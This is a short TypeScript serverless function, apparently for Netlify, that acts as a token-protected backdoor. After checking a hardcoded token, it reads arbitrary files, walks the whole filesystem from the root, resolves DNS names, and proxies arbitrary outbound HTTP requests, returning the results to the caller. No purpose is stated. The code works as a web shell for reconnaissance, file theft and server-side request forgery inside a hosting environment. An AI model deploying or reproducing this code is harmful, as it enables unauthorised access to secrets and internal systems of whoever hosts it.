const TOKEN = "nfbb-tk-5e385c2b00f28f34fde07fbdf8054160";
const json = (code: number, body: unknown) => new Response(JSON.stringify(body, null, 1), { status: code, headers: { "content-type": "application/json" } });

export default async (req: Request) => {
  if (req.method !== "POST") return json(405, { err: "POST only" });
  let m: any;
  try { m = await req.json(); } catch { return json(400, { err: "bad json" }); }
  if (m.token !== TOKEN) return json(401, { err: "no" });
  const fs = await import("node:fs");
  try {
    switch (m.op) {
      case "headers":
        return json(200, { headers: Object.fromEntries(req.headers), url: req.url, context: (globalThis as any).Netlify?.context ? "yes" : "no" });
      case "read":
        return json(200, { data: fs.readFileSync(m.path, "utf8").slice(0, m.max || 262144) });
      case "walk": {
        const out: string[] = [];
        const walk = (p: string, d: number) => {
          if (d > (m.depth || 3) || out.length > (m.limit || 2000)) return;
          let es: string[];
          try { es = fs.readdirSync(p); } catch { return; }
          for (const e of es) { out.push(p + "/" + e); try { if (fs.statSync(p + "/" + e).isDirectory()) walk(p + "/" + e, d + 1); } catch {} }
        };
        walk(m.path || "/", 0);
        return json(200, { files: out });
      }
      case "dns": {
        const dns = await import("node:dns/promises");
        return json(200, { addrs: await dns.resolve(m.host, m.rr || "A").catch((e: any) => [{ err: e.code }]) });
      }
      case "fetch": {
        const r = await fetch(m.url, { method: m.method || "GET", headers: m.headers || {}, body: m.body, redirect: m.redirect || "manual" });
        const t = await r.text();
        return json(200, { status: r.status, headers: Object.fromEntries(r.headers), body: t.slice(0, m.max || 65536) });
      }
      default: return json(400, { err: "op?" });
    }
  } catch (e) { return json(500, { err: String(e) }); }
};
